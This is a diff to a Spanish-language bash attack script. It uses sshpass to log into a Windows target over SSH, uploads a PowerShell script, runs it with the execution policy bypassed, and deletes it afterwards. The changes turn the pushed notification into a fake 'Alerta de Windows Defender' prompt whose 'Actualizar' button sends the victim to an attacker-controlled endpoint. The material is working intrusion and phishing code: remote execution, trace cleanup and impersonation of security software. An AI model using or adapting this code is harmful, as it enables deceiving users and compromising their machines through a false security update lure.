@@ -13,7 +13,7 @@ PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
 ENDPOINT_INFO_FILE="/tmp/endpoint_info.txt"
 
 echo "================================================"
-echo "   ATAQUE SSH + ENDPOINT + NOTIFICACIÓN WINDOWS"
+echo "   ATAQUE SSH + ENDPOINT + MENSAJE WINDOWS"
 echo "================================================"
 echo
 
@@ -36,63 +36,37 @@ echo
 read -p "Usuario SSH (presiona Enter para usar el usuario actual '$USER'): " SSH_USER
 SSH_USER=${SSH_USER:-$USER}
 
+read -s -p "Ingresa la contraseña SSH: " SSH_PASSWORD
+echo
+echo
+
 echo "Intentando conectar SSH a $SSH_USER@$TARGET_IP..."
 echo
 
 # Intentar conexión SSH con timeout de 10 segundos
-# -o ConnectTimeout=10: timeout de conexión
-# -o BatchMode=yes: no preguntar contraseñas interactivamente
-# -o StrictHostKeyChecking=no: no verificar host key (solo para pruebas)
 SSH_SUCCESS=false
 
-if timeout 10 ssh -o ConnectTimeout=10 \
-                   -o BatchMode=yes \
+if sshpass -p "$SSH_PASSWORD" ssh -o ConnectTimeout=10 \
                    -o StrictHostKeyChecking=no \
                    "$SSH_USER@$TARGET_IP" "echo 'SSH OK'" 2>/dev/null; then
     SSH_SUCCESS=true
     echo -e "${GREEN}✓ Conexión SSH exitosa!${NC}"
 else
-    echo -e "${YELLOW}⚠ No se pudo conectar por SSH automáticamente${NC}"
-    echo "Posibles razones:"
-    echo "  - SSH no está habilitado en el objetivo"
-    echo "  - Se requiere contraseña (no hay clave SSH configurada)"
-    echo "  - Firewall bloqueando puerto 22"
-    echo "  - IP incorrecta o dispositivo apagado"
-    echo
-    read -p "¿Continuar de todas formas? (s/n): " CONTINUE
-    if [[ ! "$CONTINUE" =~ ^[sS]$ ]]; then
-        echo -e "${RED}Operación cancelada${NC}"
-        exit 1
-    fi
+    echo -e "${RED}ERROR: No se pudo conectar con la contraseña proporcionada${NC}"
+    exit 1
 fi
 
 echo
 
 # ============================================
-# PASO 3: Activar endpoint y enviar notificación
+# PASO 3: Enviar notificación Toast
 # ============================================
-echo -e "${BLUE}[PASO 3/3] Activando endpoint y enviando notificación...${NC}"
+echo -e "${BLUE}[PASO 3/3] Enviando notificación Toast...${NC}"
 echo
 
-# 3.1: Iniciar el endpoint en segundo plano
-echo "Iniciando endpoint API..."
-kitty --title "Endpoint API" -e bash -c "cd '$PROJECT_ROOT' && '$SCRIPT_DIR/InitEndpoint.sh'; exec bash" &
-ENDPOINT_PID=$!
-
-# Esperar a que el endpoint genere su archivo de info
-echo "Esperando a que el endpoint esté listo..."
-for i in {1..15}; do
-    if [ -f "$ENDPOINT_INFO_FILE" ]; then
-        break
-    fi
-    sleep 1
-    echo -n "."
-done
-echo
-
+# Verificar que el endpoint esté activo
 if [ ! -f "$ENDPOINT_INFO_FILE" ]; then
-    echo -e "${RED}ERROR: El endpoint no generó su información a tiempo${NC}"
-    kill $ENDPOINT_PID 2>/dev/null || true
+    echo -e "${RED}ERROR: El endpoint no está activo o no generó su información${NC}"
     exit 1
 fi
 
@@ -102,52 +76,34 @@ source "$ENDPOINT_INFO_FILE"
 echo -e "${GREEN}✓ Endpoint activo en: $URL${NC}"
 echo
 
-# 3.2: Enviar notificación a Windows
-echo "Enviando notificación al dispositivo Windows..."
-echo
 
-# Crear script PowerShell para mostrar notificación Toast en Windows 10 20H2
+# Crear script PowerShell que muestra mensaje con acción
 TOAST_SCRIPT=$(cat <<'PWSH_EOF'
-# Script para enviar Toast Notification en Windows 10
-$AppId = "ThreatAlert"
-$Title = "¡ALERTA DE SEGURIDAD!"
-$Message = "Endpoint detectado en la red: ENDPOINT_URL_PLACEHOLDER"
 
-# Registrar fuente de aplicación si no existe
-$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\$AppId"
-if (!(Test-Path $RegPath)) {
-    New-Item -Path $RegPath -Force | Out-Null
-    New-ItemProperty -Path $RegPath -Name "ShowInActionCenter" -Value 1 -PropertyType DWORD -Force | Out-Null
+Write-Host "Mostrando notificación Toast con opción para abrir endpoint..."
+Start-Sleep -Seconds 3
+try {
+    # Instalar BurntToast si no está
+    if (!(Get-Module -ListAvailable -Name BurntToast)) {
+        Install-Module BurntToast -Force -Confirm:$false -Scope CurrentUser
+    }
+    Import-Module BurntToast -ErrorAction Stop
+    
+    # Crear header
+    $header = New-BTHeader -Id 'threat' -Title 'Alerta de Windows Defender'
+    
+    # Crear botón para abrir endpoint
+    $button = New-BTButton -Content 'Actualizar' -Arguments 'ENDPOINT_URL_PLACEHOLDER'
+    
+    # Mostrar notificación
+    New-BurntToastNotification -Header $header -Text 'ALERTA DE WINDOWS DEFENDER', 'Se requiere actualizar Windows Defender', 'Haz clic en Actualizar' -Button $button
+    
+    Write-Host "Notificación Toast enviada con BurntToast"
+} catch {
+    Write-Host "Error con BurntToast: $($_.Exception.Message)"
 }
 
-# Crear notificación Toast usando Windows.UI.Notifications
-[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
-[Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType = WindowsRuntime] | Out-Null
-
-$ToastXml = @"
-<toast>
-    <visual>
-        <binding template="ToastGeneric">
-            <text>$Title</text>
-            <text>$Message</text>
-            <text>Haz clic para abrir</text>
-        </binding>
-    </visual>
-    <actions>
-        <action content="Abrir Endpoint" arguments="ENDPOINT_URL_PLACEHOLDER" activationType="protocol"/>
-        <action content="Ignorar" arguments="dismiss" activationType="system"/>
-    </actions>
-    <audio src="ms-winsoundevent:Notification.Looping.Alarm" loop="false"/>
-</toast>
-"@
-
-$XmlDocument = [Windows.Data.Xml.Dom.XmlDocument]::new()
-$XmlDocument.LoadXml($ToastXml)
-
-$Toast = [Windows.UI.Notifications.ToastNotification]::new($XmlDocument)
-[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier($AppId).Show($Toast)
-
-Write-Host "Notificacion Toast enviada correctamente"
+Write-Host "Mensaje mostrado"
 PWSH_EOF
 )
 
@@ -163,26 +119,26 @@ if [ "$SSH_SUCCESS" = true ]; then
     echo "Enviando script PowerShell vía SSH..."
     
     # Copiar script al Windows remoto
-    if scp -o ConnectTimeout=10 \
+    if sshpass -p "$SSH_PASSWORD" scp -o ConnectTimeout=10 \
            -o StrictHostKeyChecking=no \
            "$TEMP_PS1" "$SSH_USER@$TARGET_IP:C:/Windows/Temp/notification.ps1" 2>/dev/null; then
         
         echo "Ejecutando notificación en Windows..."
         
         # Ejecutar PowerShell remoto
-        ssh -o ConnectTimeout=10 \
+        sshpass -p "$SSH_PASSWORD" ssh -o ConnectTimeout=10 \
             -o StrictHostKeyChecking=no \
             "$SSH_USER@$TARGET_IP" \
             "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\notification.ps1" 2>/dev/null
         
         if [ $? -eq 0 ]; then
-            echo -e "${GREEN}✓ Notificación Toast enviada exitosamente!${NC}"
+            echo -e "${GREEN}✓ Mensaje con acción enviado! El usuario puede hacer clic en OK para abrir el endpoint.${NC}"
         else
-            echo -e "${YELLOW}⚠ La notificación pudo no mostrarse (permisos o configuración)${NC}"
+            echo -e "${YELLOW}⚠ El mensaje pudo no mostrarse (permisos o configuración)${NC}"
         fi
         
         # Limpiar archivo remoto
-        ssh -o ConnectTimeout=10 \
+        sshpass -p "$SSH_PASSWORD" ssh -o ConnectTimeout=10 \
             -o StrictHostKeyChecking=no \
             "$SSH_USER@$TARGET_IP" \
             "del C:\\Windows\\Temp\\notification.ps1" 2>/dev/null || true
@@ -207,11 +163,8 @@ echo "               OPERACIÓN COMPLETA"
 echo "================================================"
 echo -e "${GREEN}✓ Endpoint activo: $URL${NC}"
 echo -e "${GREEN}✓ Objetivo: $TARGET_IP${NC}"
-echo -e "${GREEN}✓ Notificación enviada${NC}"
+echo -e "${GREEN}✓ Mensaje con acción enviado${NC}"
 echo
-echo "El endpoint seguirá ejecutándose en segundo plano."
-echo "Para detenerlo, cierra la terminal 'Endpoint API' o presiona Ctrl+C"
+echo "El endpoint continúa ejecutándose en segundo plano."
+echo "Para detenerlo, usa el script AttackAutomatization.sh o cierra manualmente."
 echo
-
-# Mantener el script en ejecución
-wait $ENDPOINT_PID
